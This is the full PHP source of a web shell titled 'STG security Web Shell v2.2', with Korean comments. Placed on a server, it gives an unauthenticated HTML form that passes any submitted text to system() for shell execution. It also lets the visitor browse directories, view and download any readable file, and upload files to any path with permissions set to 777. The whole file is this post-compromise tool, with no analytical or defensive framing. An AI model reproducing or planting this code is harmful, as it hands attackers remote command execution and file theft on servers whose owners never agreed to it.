<?php

$version = "2.2";

/* Global 옵션을 지원하는지 여부에 따라서 */
if(($page = $_SERVER['PHP_SELF']) != "") {
        $cmd = $_POST['cmd'];                                                        // 명령
        $tmp_file = $_FILES['up_file']['tmp_name'];                 // 임시 파일명
        $up_file_name = $_FILES['up_file']['name'];                // 업로드되는 파일명

        /* GET인지 POST인지를 구분 */
        if(($method = $_SERVER['REQUEST_METHOD']) == "POST") {
                $loc = $_POST['loc'];
        } else {
                $loc = $_GET['loc'];
                $whatmode = $_GET['whatmode'];
        }
} else {
        $method = $HTTP_SERVER_VARS['REQUEST_METHOD'];
        $cmd = $cmd;
        $page = $PHP_SELF;
        $loc = $loc;
        $whatmode = $whatmode;
        $tmp_file = $HTTP_POST_FILES['up_file']['tmp_name'];
        $up_file_name = $HTTP_POST_FILES['up_file']['name'];
}

/* 파일의 권한을 출력하는 함수 */
function getPerm($file) {
        $in_Perms = filePerms($file);
        $sp;

        if($in_Perms & 0x1000) $sp = 'p';                        // FIFO pipe;
        elseif($in_Perms & 0x2000) $sp = 'c';                // Caracter special
        elseif($in_Perms & 0x4000) $sp = 'd';                // Direcotry
        elseif($in_Perms & 0x6000) $sp = 'b';                // Block special
        elseif($in_Perms & 0x8000) $sp = '?';        // Regular
        elseif($in_Perms & 0xA000) $sp = 'l';                 // Symbolic Link
        elseif($in_Perms & 0xC000) $sp = 's';                // Socket
        else $sp = 'u';                                                                // UNKONWN

        // owner
        $sp .= (($in_Perms & 0x0100) ? 'r' : '?') .
                  (($in_Perms & 0x0080) ? 'w' : '?') .
                  (($in_Perms & 0x0040) ? (($in_Perms & 0x0800) ? 's' : 'x') :
                                          (($in_Perms & 0x0800) ? 'S' :
                                                                   '?'));
        // group
        $sp .= (($in_Perms & 0x0020) ? 'r' : '?') .
                  (($in_Perms & 0x0010) ? 'w' : '?') .
                  (($in_Perms & 0x0008) ? (($in_Perms & 0x0400) ? 's' : 'x') :
                                          (($in_Perms & 0x0400) ? 'S' :
                                                                   '?'));
        // other
        $sp .= (($in_Perms & 0x0004) ? 'r' : '?') .
                  (($in_Perms & 0x0002) ? 'w' : '?') .
                  (($in_Perms & 0x0001) ? (($in_Perms & 0x0200) ? 's' : 'x') :
                                          (($in_Perms & 0x0200) ? 'S' :
                                                                   '?'));
        return $sp;
}

/* 디렉토리의 리스트를 출력하는 함수 */
function listf($rpath) {
        global $page;

        $ctime = getdate();                        // 현재 시간
        $cyear = $ctime['year'];        // 현재 년도
        if(is_readable($rpath)) {
                $dh  = opendir($rpath);

                /* 테이블 출력 */
                echo "<table border=\"0\">\n";
                while(false !== ($file = readdir($dh))) {
                        /* 파일의 전체 경로 */
                        if($rpath == "/") {
                                $full_name = $rpath . $file;
                        } else {
                                $full_name = $rpath . "/" . $file;
                        }
                        $perm = getPerm($full_name);
                        /* 현재 연도라면 수정 일자, 아니라면 해당 연도를 출력 */
                        if($cyear == date("Y", filemtime($full_name))) {
                                $mtime = date("M d D h:i", filemtime($full_name));
                        } else {
                                $mtime = date("M d D Y", filemtime($full_name));
                        }
                        $owner = fileowner($full_name);
                        $group = filegroup($full_name);
                        $size = filesize($full_name);
                        $type = filetype($full_name);

                        /* 만약 디렉토리라면 */
                        if(is_dir($full_name)) {
                                echo "<tr>\n";
                                echo "<td nowrap align=\"right\">$perm</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap align=\"right\">$owner</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap align=\"right\">$group</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap>$mtime</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap align=right>$size</td>\n";
                                echo "<td nowrap>$type</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap align=\"left\"><a
                                        href=\"$page?loc=$full_name&whatmode=list\">$file</a></td>\n";
                                echo "</tr>\n";
                        /* 파일이라면 */
                        } else {
                                echo "<tr>\n";
                                echo "<td nowrap align=\"right\">$perm</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap align=\"right\">$owner</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap align=\"right\">$group</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap>$mtime</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap align=right>$size</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap><a
                                        href=\"$page?loc=$full_name&whatmode=download\">[D]</a></td>\n";
                                echo "<td nowrap><a
                                        href=\"$page?loc=$full_name&whatmode=view\">$file</a></td>\n";
                                echo "</tr>\n";
                        }
                }
                echo "</table>";
                closedir($dh);
        } else {
                echo "<br>Don't have right permission!";
        }

}

/* 파일의 내용을 보는 함수 */
function viewf($file) {
        global $page;

        if(is_readable($file)) {
                $fp = fopen($file, "r");
                $contents = fread($fp, filesize($file));
                echo "<xmp>\n";
                echo "$contents";
        } else {
                echo "Don't have right permission!";
        }
}

/* 파일 다운로드 함수 */
function downf($rpath) {
        $file_name = basename($rpath);
        $dnfile = urlencode($file_name);

        /* HEADER */
        header("Content-Type: application/octet-stream");
        header("Content-Length: " . filesize("$rpath"));
        header("Content-Disposition: attachment; filename=$dnfile");
        header("Content-Transfer-Encoding: binary");
        header("Pragma: no-cache");
        header("Expires: 0");

        if(is_file("$rpath")) {
                $fp = fopen("$rpath", "r");
                if(!fpassthru($fp)) fclose($fp);
        } else {
                echo "해당 파일이나 경로가 존재하지 않습니다.";
        }
}

/* html 헤더 함수 */
function _head() {
        global $version;

        echo "<html>\n";
        echo "<head><title>STG security Web Shell v" . $version . "</title></head>\n";
        echo "<body>\n";
        echo "<font face=fixedsys>\n";
}

/* html FORM 함수 */
function _form($loc) {
        global $page;

        /* 파일이라면 디렉토리명만 */
        if(is_file($loc)) {
                $current = eregi_replace(strrchr($loc, "/"), "", $loc);
        } else {
                $current = $loc;
        }

        echo "<form name=\"stg\" method=\"post\" action=\"$page\"
                enctype=\"multipart/form-data\">
                <b>[$current]</b>
                <input type=\"text\" name=\"cmd\" size=\"70\">
                <input type=\"submit\" name=\"submit\" value=\"Run\">
                <br>
                Upload Path :
                <input type=\"text\" name=\"loc\" value=\"$current\">
                Upload File :
                <input type=\"file\" name=\"up_file\">
                </form>\n";

        /* 상위 디렉토리로 이동 */
        if(!empty($loc)) {
                $upper = eregi_replace(strrchr($loc, "/"), "", $loc);
                if(empty($upper)) {
                        $upper = "/";
                }
        } else {
                $upper = "/";
        }

        echo "[Dir: <a href=\"$page?loc=$upper&whatmode=list\">$current</a>]\n";
}

/* 메인 프로시져 */
/* POST 라면 */
if($method == "POST") {
        /* 파일 업로드일 경우 */
        if(!empty($tmp_file) && $tmp_file != 'none') {
                $dest = $loc . "/" . $up_file_name;
                copy($tmp_file, $dest);
                system("chmod 777 $dest");
                header("Location: $page?loc=$loc&whatmode=list");
        } else {
                _head();
                _form($loc);
                echo "<xmp>\n";
                system("($cmd) 2>&1");
        }

/* GET일 경우 */
} else {
        /* 현재 디렉토리 초기화 */
        if($loc == "" | $whatmode == "") {
                $loc = ".";
                $whatmode = "list";
        }

        /* 디렉토리에서 파일 리스트 받아오기 */
        $rpath = realpath($loc);

        /* Mode 별 */
        switch($whatmode) {
                case "list":
                        _head();
                        _form($rpath);
                        listf($rpath);
                        break;
                case "view":
                        _head();
                        _form($rpath);
                        viewf($rpath);
                        break;
                case "download":
                        downf($rpath);
                        break;
                default:
                        echo "Non!";
                        break;
        }
}
